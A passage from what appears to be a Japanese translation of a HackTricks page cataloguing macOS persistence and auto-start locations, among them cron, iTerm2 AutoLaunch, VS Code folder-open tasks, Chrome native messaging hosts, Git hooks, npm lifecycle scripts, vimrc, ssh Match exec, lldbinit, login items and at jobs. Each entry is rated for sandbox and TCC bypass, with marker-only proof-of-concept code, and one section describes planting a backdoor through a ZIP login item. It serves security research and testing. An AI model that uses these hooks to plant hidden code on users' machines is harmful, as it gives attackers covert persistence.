使い捨てアカウントでは、マーカーのみのユーザー cron エントリを `crontab` で設定し、確認後に削除できます。`crontab <file>` を実行すると、そのアカウントの既存の crontab 全体が**置き換えられる**ため、使い捨てでない場合は保存してから復元してください:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

解説: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 は以前、TCC permissions が付与されていた

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Trigger**: このフォルダ内の対象となる Python API script とともに iTerm2 を起動する
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Trigger**: iTerm2 を起動する。AppleScript の startup hook については別途ドキュメントに記載されている
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Trigger**: command または initial text で payload を実行する profile を使って session を作成する

#### Description & Exploitation

[現行の iTerm2 Python API guide](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) には、`~/Library/Application Support/iTerm2/Scripts/AutoLaunch` 内の **Python** script を自動実行する方法が記載されています。このフォルダ内にある任意の実行可能な `.sh` file が実行されるとは述べていません。使い捨ての account で、以下を `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py` として保存します:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[現行の iTerm2 AppleScript ガイド](https://iterm2.com/documentation-scripting.html)では、`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`が別途説明されており、最新のフォルダが存在しない場合は、従来の`~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt`がフォールバックとして使われます。マーカーのみを設定する AppleScript は次のとおりです。

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

これらのスクリプト例は、アクティブなデスクトップセッションでは実行せず、iTerm2のドキュメントに照らして確認しました。使い捨てアカウントでテストした後、それぞれテスト用スクリプトと`/tmp/ht-iterm-autolaunch-marker`または`/tmp/iterm2-autolaunchscpt`を削除してください。

**`~/Library/Preferences/com.googlecode.iterm2.plist`**にあるiTerm2の環境設定では、プロファイルコマンドまたは初期テキストを指定できます。初期テキストはセッションに入力され、実行されるかどうかはシェルがそれを解釈するかによります。[iTerm2のプロファイルに関するドキュメント](https://iterm2.com/documentation-preferences-profiles-general.html)には、そのプロファイルで新しいセッションが作成されたときに実行されるコマンドについて説明されています。

この設定はiTerm2の設定で構成できます。

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

また、コマンドは環境設定にも反映されます。

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

安全に評価するには、iTerm2 の設定で選択したプロファイルを確認するか、その設定ファイルのコピーを読み取ってください。稼働中のプロファイルで `Initial Text` を変更するとユーザーのセッションに影響するため、調査用 Mac では設定を変更していません。

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- サンドボックス回避に有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、xbar がインストールされている必要があります
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - アクセシビリティの権限を要求します

#### 場所

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **トリガー**: xbar の実行時

#### 説明

一般的なプログラム [**xbar**](https://github.com/matryer/xbar) がインストールされている場合、**`~/Library/Application\ Support/xbar/plugins/`** にシェルスクリプトを作成すると、xbar の起動時に実行されます:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、Hammerspoon がインストールされている必要があります
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Accessibility の権限を要求します

#### 場所

- **`~/.hammerspoon/init.lua`**
  - **トリガー**: Hammerspoon の実行時

#### 説明

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) は、**LUA scripting language** を利用した **macOS** 向けの automation platform です。AppleScript のコード全体を組み込めるほか、shell scripts も実行できるため、スクリプト機能が大幅に強化されます。<sup>[[13]](#references)</sup>

このアプリは単一のファイル `~/.hammerspoon/init.lua` を検索し、起動時にそのスクリプトを実行します。

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、BetterTouchToolがインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Automation-ShortcutsとAccessibilityの権限を要求する

#### 場所

- 有効なBetterTouchToolプリセットから**すでに参照されている**スクリプトファイル、またはそのプリセットの設定ファイル（`~/Library/Application Support/BetterTouchTool/` 内）。正確なスクリプトのパスは、プリセットの設定方法によって異なる。

[BetterTouchToolのアクションリファレンス](https://docs.folivora.ai/docs/actions/action-definitions/)には、シェルスクリプトとバックグラウンドコマンドのアクションが記載されている。関連するプリセットが有効な間に、設定済みのキーボード、マウス、タッチ、ウィジェット、その他のイベントが発生する必要がある。[トリガーのガイド](https://docs.folivora.ai/docs/configuration/new-trigger/)では、この組み合わせが説明されている。Application Supportディレクトリ内の無関係なファイルはトリガーにはならない。外部の書き込み可能なスクリプトを読み込むよう設定済みのアクションは、より限定的なwrite-to-executionの対象となる。コードはBetterTouchToolを使用するユーザーのアカウントで実行され、実際に付与されているmacOSの権限に従う。調査用Macでは`/Applications`にBetterTouchToolがなかったため、ローカルではプリセットの変更や実行は行っていない。

### Alfred

- sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、Alfredがインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Automation、Accessibility、さらにはFull-Disk accessの権限を要求する

#### 場所

- インストール済みのAlfred workflowから**すでに参照されている**スクリプトまたはファイル、またはユーザーが設定した`Alfred.alfredpreferences`ディレクトリ内のworkflow。設定ディレクトリは同期されている場合があり、誰にとっても共通の固定パスではない。

[Alfredのworkflowガイド](https://www.alfredapp.com/help/workflows/)では、Powerpackが必要なことと、UIからインストールする方法が説明されている。インストール済みworkflowのhotkey、keyword、その他の設定済みトリガーが発火する必要がある。[Alfredのhotkeyの例](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/)では、スクリプトアクションが示されている。[Alfredの環境変数リファレンス](https://www.alfredapp.com/help/workflows/script-environment-variables/)では、選択中の設定パスが`alfred_preferences`として公開される。任意のディレクトリに未登録のworkflowファイルを置いても、インストールまたは実行される根拠にはならない。コードはサインイン中のAlfredユーザーとして実行され、実際に付与されているmacOSの権限に従う。調査用Macでは`/Applications`にAlfredがなかったため、この経路はドキュメントのみをもとに評価した。

### Raycast Script Commandsとextension refresh

- **書き込み先:** Raycast Settings → Script Commandsで**すでに追加されている**ディレクトリ内の実行可能なスクリプト。Raycastは新たに作成された任意のディレクトリをスキャンしない。[RaycastのScript Commandsガイド](https://manual.raycast.com/script-commands)に、ディレクトリの登録方法が記載されている。
- **トリガーと実行ユーザー:** ユーザーがインデックス化されたコマンドを実行する、設定済みのhotkeyまたはfallbackが呼び出す、あるいは設定された`@raycast.refreshTime`に従ってRaycastが`inline`スクリプトをrefreshする。スクリプトはインタープリターを介して、サインイン中のRaycastユーザーとして実行される。[上流のmetadataリファレンス](https://github.com/raycast/script-commands#metadata)によると、自動refreshの対象はinlineコマンドに限られる。また、[Raycastのextension manifest](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md)では、インストール済みの`no-view`または`menu-bar` extensionコマンドに対して、別途`interval`がサポートされている。通常のScript Commandを追加しただけでは、実行はスケジュールされない。

登録済みのスクリプトディレクトリがある使い捨てアカウントでは、マーカーのみを出力するinlineスクリプトは次のようになる。

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

登録済みディレクトリに保存し、実行可能にしてから、Raycast に更新させます。その後、そのファイルと `/tmp/ht-raycast-refresh-marker` を削除します。調査用 Mac では、通常の `/Applications` 名で Raycast が見つからなかったため、これはドキュメントに基づく説明であり、ローカルでは実行していません。Accessibility、Automation、ファイルへのアクセス許可は、引き続き macOS の許可プロンプトに従います。

### Visual Studio Code の自動ワークスペースタスク

- **書き込み先:** ユーザーが開くワークスペース内の `.vscode/tasks.json`。
- **トリガー:** VS Code でそのワークスペースを開いたとき。ただし、フォルダーが信頼済みで、かつ自動タスクが許可されている場合に限ります。信頼されていないワークスペースでは、自動タスクは実行されません。デフォルト設定では、最初の自動実行の前にユーザーへ確認を求めます。[VS Code のタスクに関するドキュメント](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) と [Workspace Trust のドキュメント](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) で、これら両方の条件について説明されています。
- **実行時のユーザー:** 設定されたタスクプロセスを通じて、VS Code ユーザーのアカウントで実行されます。これはアプリケーション固有の実行であり、ログイン時の永続化ではありません。

**新しい使い捨てのワークスペース**で、次のマーカーのみを作成するタスクを `.vscode/tasks.json` に配置します。

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

信頼済みの workspace を開いて自動タスクを許可した後、`.autostart-task-ran` を確認してください。クリーンアップするには、タスクエントリとマーカーを削除します。**これは Microsoft のドキュメントおよびインストール済みの VS Code 1.139.1 バンドルに照らして検証済みですが、アクティブなデスクトップセッションでは実行していません。**

### Chrome native messaging hosts

- **書き込み先:** 現在のユーザーの場合は `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json`、全ユーザーの場合は `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json`（書き込みには admin 権限が必要）。Chromium と Chrome for Testing ではディレクトリが異なります。[Chrome の現在のパス一覧](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location)を参照してください。
- **トリガー:** `nativeMessaging` 権限を持つインストール済みの Chrome 拡張機能が、manifest に記載された正確なホスト名を使って `chrome.runtime.connectNative()` または `chrome.runtime.sendNativeMessage()` を呼び出します。すると Chrome がホスト実行ファイルを起動します。Chrome を開くだけでは、新しい任意の native host は実行されません。呼び出し元の拡張機能がなければ、manifest を作成しても何も起こりません。[Chrome の native messaging ガイド](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging)では、このハンドシェイクについて説明しています。
- **実行時の ID:** Chrome ユーザーのアカウント。manifest には実行ファイルの絶対パスを指定し、呼び出し元の拡張機能の origin を明示的に許可する必要があります。

使い捨てのブラウザーアカウントとテスト用拡張機能を使って、以下の 2 つのファイルで書き込みから実行へのつながりを実証できます。manifest のファイル名は `name` と一致させ、`TEST_EXTENSION_ID` はその拡張機能の実際の ID に置き換える必要があります。

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

この JSON を `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json` として保存します。manifest の `path` に指定する marker 専用実行ファイルには、次の内容を含められます。

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

テスト用拡張機能が service worker または拡張機能ページから `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` を呼び出した後、marker によりホストが起動したことを確認できます。この最小限のホストは Chrome の長さプレフィックス付き応答プロトコルを実装していないため、marker の書き込み後に拡張機能でメッセージングエラーが報告される場合があります。クリーンアップするには、テスト用の manifest、ホスト、marker を削除してください。macOS 26.5.2 では Chrome アプリと両方の manifest ディレクトリが存在していました。**アクティブな Chrome プロファイルは変更も使用もしていません。**

### Karabiner-Elements のキーイベントコマンド

- **書き込み先:** Karabiner-Elements がインストールされ、実行中のアカウントにある `~/.config/karabiner/karabiner.json`。[Karabiner のファイル保存場所に関するガイド](https://karabiner-elements.pqrs.org/docs/json/location/)によると、アプリはこのファイルを監視し、書き込み後に再読み込みします。`assets/complex_modifications` 内の JSON ファイルはインポート可能なプリセットにすぎません。そこに書き込んだだけではルールは有効になりません。
- **トリガー:** ルールが有効になった後に設定されたキーイベント。[`to.shell_command` のリファレンス](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/)には、コマンドの実行方法が記載されています。これはログイン時やファイル書き込みのたびにコードを実行するものではありません。
- **実行時のユーザー:** Karabiner のユーザープロセスを実行しているサインイン中のユーザー。アプリ自体に付与された権限と TCC アクセスの有無は、アプリとバージョンによって異なります。

使い捨てのテストアカウントで、`karabiner.json` の選択したプロファイルにある `complex_modifications.rules` 配列へこのルールオブジェクトを追加し、そのプロファイルの残りの設定は維持してください。F18 を押して無害な marker を作成し、その後、このルールと marker を削除してください。通常のタイピングキーを置き換えないよう、F18 を選んでいます。

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

macOS 26.5.2 のテストマシンには Karabiner-Elements が `/Applications` にインストールされていなかったため、これはローカルでの実行結果ではなく、ドキュメントに基づく PoC です。

### ローカルリポジトリの Git hooks

- **書き込み先:** `<repo>/.git/hooks/post-checkout` などの実行可能な hook。`core.hooksPath` がすでに設定されている場合は、代わりに設定済みのディレクトリを使用します。通常の追跡対象ソースファイルとして commit された hook は、clone 先に自動ではインストールされません。
- **トリガー:** 対応する Git 操作。たとえば `post-checkout` は `git checkout` または `git switch` の後に実行され、clone や worktree の作成後にも実行される場合があります。[Git の hook リファレンス](https://git-scm.com/docs/githooks)にはイベントと実行可能ビットの要件が記載されています。[`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) は hook の検索ディレクトリを変更します。
- **実行ユーザー:** Git を実行するアカウント。hook が実行されるには、リポジトリで有効な hooks ディレクトリに対して実行者が書き込み可能であり、その後ユーザーが該当する Git 操作を実行する必要があります。

このマーカーのみの PoC は、使い捨てのリポジトリを作成して hook を1つ設定し、ブランチを切り替えます。macOS 26.5.2 上で Apple Git 2.50.1 を使用して正常に実行しました：

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### プロジェクト内の npm lifecycle scripts

- **書き込み先:** 書き込み可能なプロジェクトの `package.json` 内の `scripts` マップ、またはユーザーが lifecycle script を実行する、インストール済みの依存パッケージ。これは開発ワークフローの hook であり、ディレクトリを開いただけで実行されるものではありません。
- **トリガーと実行ユーザー:** lifecycle scripts が許可された状態で後から `npm install` または `npm ci` を実行すると、npm を実行したユーザーとして `preinstall`、`install`、`postinstall` が実行されます。通常の `npm run <name>` でも、対応する `pre<name>` および `post<name>` scripts が実行されます。[npm の lifecycle リファレンス](https://docs.npmjs.com/cli/v11/using-npm/scripts) にイベント一覧があります。`ignore-scripts` を指定すると、インストール時の lifecycle scripts を抑止できます。[`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts)。許可される内容はバージョンやポリシー設定によって変わる場合があるため、対象の npm バージョンを確認してください。

この marker-only PoC は、使い捨ての空ディレクトリでローカルの npm を使って実行しました。依存関係をダウンロードしたり、ユーザーのプロジェクトを変更したりすることはありません:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

これは Python インタープリターの起動ファイルとは異なります。npm の場合、該当する install または run アクションを実行する必要がありますが、Python の `site` コードは通常のインタープリター起動時に読み込まれます。同様に、一般的な `Makefile` のターゲットやビルドタスク定義も、ユーザーまたは設定済みのツールがそのターゲットを実行する必要があります。これらは独立した OS の自動起動経路ではありません。

### Vim の起動設定

- **書き込み先:** Vim を起動するユーザーの `~/.vimrc`（または Vim の初期化順序で選択される別の起動ファイル）。[Vim の起動に関するリファレンス](https://vimhelp.org/starting.txt.html)には、このファイルと `VIMINIT`/`EXINIT` による上書きが記載されています。
- **トリガー:** この設定を読み込む、その後の通常の Vim 起動。Vim の `-u NONE` はユーザーの vimrc を読み込みません。これはエディター固有の実行であり、OS のログイントリガーではありません。
- **実行時のユーザー:** Vim を起動するユーザーのアカウント。

以下の分離された PoC は macOS の `/usr/bin/vim` で実行しました。実際の Vim 設定や開いているドキュメントには書き込みません。

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim には独立したユーザー設定パス `$XDG_CONFIG_HOME/nvim/init.lua` または `init.vim` があり、[startup documentation](https://neovim.io/doc/user/starting/) に従って `plugin/` runtime ディレクトリ内のスクリプトも読み込みます。macOS 26.5.2 のテストマシンには Neovim がインストールされていなかったため、このバリアントはそこで実行していません。

### SSH client configuration commands

- **書き込み先:** `~/.ssh/config`、またはそのファイルからすでに読み込まれている別のファイル。これは**クライアント側**の設定ファイルで、後述するサーバー側の `~/.ssh/rc` とは別です。
- **トリガー:** 条件に一致する `ssh` の実行。`Match exec` は、接続せずに設定を出力する `ssh -G` の場合も含め、クライアントが設定を評価する際にローカルコマンドを実行します。`ProxyCommand` は、クライアントが条件に一致する接続を確立する際に実行されます。`LocalCommand` は接続に成功した後にのみ実行され、`PermitLocalCommand yes` が必要です（デフォルトは `no`）。これらは実行タイミングと前提条件が異なり、書き込んだだけでは実行されません。OpenSSH の公式 [`ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5) を参照してください。
- **実行ユーザー:** `ssh` を実行するローカルユーザー。一致するホスト、適用対象の設定ファイル、および必要な接続が必要です。`ssh -F` で別の設定ファイルを指定できます。

このマーカーのみの PoC は、macOS 26.5.2 上で Apple の SSH client を使って実行しました。`-G` はネットワーク接続を行わず、ユーザーの実際の SSH 設定も読み込まずに `Match exec` を実行します。

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Debugger 初期化ファイル

- **書き込み先:** `~/.lldbinit` または優先順位の高いアプリケーション固有ファイル（例: `~/.lldbinit-lldb`）。LLDB はデバッガの起動時にいずれか1つを読み込みます。カレントディレクトリの `.lldbinit` はデフォルトでは実行されません。ユーザーが `target.load-cwd-lldbinit` を有効にするか、`--local-lldbinit` を指定する必要があります。[LLDB manual](https://lldb.llvm.org/man/lldb.html)を参照してください。
- **トリガーと実行ユーザー:** ユーザーが `--no-lldbinit` を指定せずに LLDB を起動すると、コマンドはそのユーザーとして実行されます。プロジェクトを開いただけでは、プロジェクトの `.lldbinit` が実行されるとは限りません。

以下のマーカーのみを使ったテストは、ホームディレクトリと作業ディレクトリを分離した環境で、macOS 26.5.2 の LLDB に対して実行しました。

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB**、[upstream の起動に関するドキュメント](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html)には、macOS では `$HOME/Library/Preferences/gdb/gdbinit`、次に `~/.gdbinit` を読み込むと記載されています。カレントディレクトリの `.gdbinit` には[自動読み込みのセーフパス](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html)が適用され、`-nx`/`-nh` は初期化ファイルの読み込みを抑制します。テスト用の Mac には GDB がインストールされていなかったため、このパターンはローカルで実行していません。

### SSHRC

解説: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- sandbox の回避に有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、ssh が有効化され、使用されている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - SSH を使用して FDA アクセスを取得

#### 場所

- **`~/.ssh/rc`**
  - **トリガー**: ssh でログイン
- **`/etc/ssh/sshrc`**
  - root 権限が必要
  - **トリガー**: ssh でログイン

> [!CAUTION]
> ssh を有効にするには Full Disk Access が必要です。
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### 説明と悪用

デフォルトでは、`/etc/ssh/sshd_config` に `PermitUserRC no` が設定されていない限り、ユーザーが **SSH でログインすると**、スクリプト **`/etc/ssh/sshrc`** と **`~/.ssh/rc`** が実行されます。<sup>[[14]](#references)</sup>

### **ログイン項目**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- sandbox のバイパスに有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、引数付きで `osascript` を実行する必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **登録済みログイン項目の helper app:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app`（一般的なバンドル内の場所）。
  - **起動条件:** 登録時に helper がすぐ起動する場合があります。その後は、承認状況に応じて、以降のユーザーログイン時にも起動します。
- **登録済みバンドル agent/daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` または `Contents/Library/LaunchDaemons/<name>.plist`。
  - **起動条件:** 承認済みの agent は登録時および以降のログイン時に起動する場合があります。承認済みの daemon は起動時に起動します。daemon の登録には管理者の承認が必要です。

#### 説明

**システム設定 → 一般 → ログイン項目と機能拡張**では、ログイン項目とバックグラウンド項目を確認できます。macOS 13 以降では、バンドルされたログイン項目、launch agent、launch daemon の登録に [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) を使用できます。その [`register()` の動作](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29)は、種類と承認状況によって異なります。**helper を app bundle に書き込むだけでは、新しいログイン項目は登録されません。**一方、すでに登録済みの helper 実行ファイルが書き込み可能な場合、新たな登録を行わなくても、その実行ファイルを変更することで次回の起動に影響を与えられます。まず実際のパスと code-signing のチェックを確認してください。

以下は、Mac 上でバンドルされた helper を調べる読み取り専用の方法です。登録も起動もしません。

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

バンドルされた launch plist では、`BundleProgram` は app bundle のルートを基準に解決します（例: `Contents/MacOS/Helper`）。これは[Apple の Service Management 移行ガイダンス](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos)に記載されています。調査用 Mac の `/Applications` を読み取り専用で調べたところ、バンドルされた helper エントリが14件、`BundleProgram` 宣言が5件見つかりました。5つのターゲットはすべて解決でき、そのうち2つはユーザーによる書き込み可否チェックに合格しました。このチェックだけでは、いずれかの helper が登録済み、有効、署名検証後に実行可能、または sandbox から到達可能であるとは確認できません。この Mac で `sfltool dumpbtm` は名前付きレコードを150件表示しましたが、これは調査補助ツールであり、すべてのレコードが実行中であることを検証するものではありません。

古い login item も Apple events 経由で管理できます。コマンドラインから一覧表示、追加、削除が可能ですが、追加するとユーザーの永続的な login 設定が変更され、Automation の承認が必要になる場合があります:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` は実装上の詳細であり、単にファイルを書き込んで payload をインストールするための、サポート対象の場所ではありません。古い `SMLoginItemSetEnabled` API は、新しいヘルパーでは `SMAppService` に置き換えられています。このページに以前記載されていた `/var/db/com.apple.xpc.launchd/loginitems.501.plist` のパスは、macOS 26.5.2 のテストマシンには存在しませんでした。最新の Login Item を評価する際は、データベースのパスを前提とせず、登録 API とシステム UI の状態を確認してください。

### ZIP as Login Item

（Login Item に関する前のセクションを参照してください。この内容はその補足です）

**ZIP** ファイルを **Login Item** として保存すると、**`Archive Utility`** がそれを開きます。たとえば ZIP が **`~/Library`** に保存され、バックドアを含む **`LaunchAgents/file.plist`** フォルダーが入っていた場合、そのフォルダーが作成され（デフォルトでは存在しません）、plist が追加されます。そのため、次回ユーザーがログインしたときに、plist に指定された **backdoor が実行されます**。

別の方法として、ユーザーの HOME 内に **`.bash_profile`** と **`.zshenv`** ファイルを作成する方法があります。これなら、LaunchAgents フォルダーがすでに存在する場合でも、この手法は機能します。

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- sandbox のバイパスに有効: [✅](https://emojipedia.org/check-mark-button)
  - ただし、**`at`** を **実行**する必要があり、有効化されていなければなりません
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`** を **実行**する必要があり、有効化されていなければなりません

#### **Description**

`at` タスクは、指定した時刻に実行する**一度限りのタスクをスケジュールする**ためのものです。cron ジョブとは異なり、`at` タスクは実行後に自動的に削除されます。重要な点として、これらのタスクはシステムの再起動後も保持されるため、特定の条件下ではセキュリティ上の懸念となる可能性があります。<sup>[[16]](#references)</sup>

同梱の `com.apple.atrun.plist` では `Disabled = true` になっていますが、launchd は実際に有効か無効かを示すオーバーライドを別に保持します。macOS 26.5.2 のテストマシンでは、`launchctl print-disabled system` により、同梱 plist の設定にかかわらず `com.apple.atrun` が**有効**と報告されました。`at` ジョブが実行されると主張する前に、実際の状態を確認してください:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

管理者は `launchctl` を使って無効化された `atrun` サービスを有効にできます。以下の過去の例はシステムサービスの状態を変更するものであり、調査用 Mac では**実行していません**。

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

これは1時間後にファイルを作成します:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

`atq:` を使用してジョブキューを確認します:

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

上記では、2つのジョブがスケジュールされていることがわかります。`at -c JOBNUMBER` を使うと、ジョブの詳細を表示できます。

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> AT tasks が有効になっていない場合、作成されたタスクは実行されません。

**job files** は `/private/var/at/jobs/` にあります。

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
